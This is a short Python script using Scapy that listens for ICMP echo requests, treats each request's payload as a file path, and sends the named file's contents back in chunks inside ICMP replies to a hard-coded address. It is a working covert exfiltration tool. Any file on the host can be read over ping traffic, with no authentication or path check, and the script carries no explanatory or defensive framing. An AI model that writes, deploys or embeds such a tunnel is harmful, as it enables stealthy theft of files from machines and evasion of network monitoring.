from scapy.all import *

def handle_icmp_packet(packet):
    print("abc")
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
        
        file_name = packet[ICMP].load.decode('utf-8')

        
        try:
            with open(file_name, 'r') as file:
                data = file.read()
        except FileNotFoundError:
            print("File not found.")
            return

        
        packet_size = 50  
        num_packets = (len(data) + packet_size - 1) // packet_size

        
        for i in range(num_packets):
            start = i * packet_size
            end = (i + 1) * packet_size
            message = data[start:end]
            icmp_packet = IP(dst="192.168.18.142") / ICMP(type=0) / message.encode('utf-8')
            send(icmp_packet, verbose=False)

        print("Response sent successfully.")

def main():
    filter_str = "icmp and icmp[icmptype] == icmp-echo"
    
    print(filter_str)
    sniff(filter=filter_str, prn=handle_icmp_packet , iface="eth0")

if __name__ == "__main__":
    main()
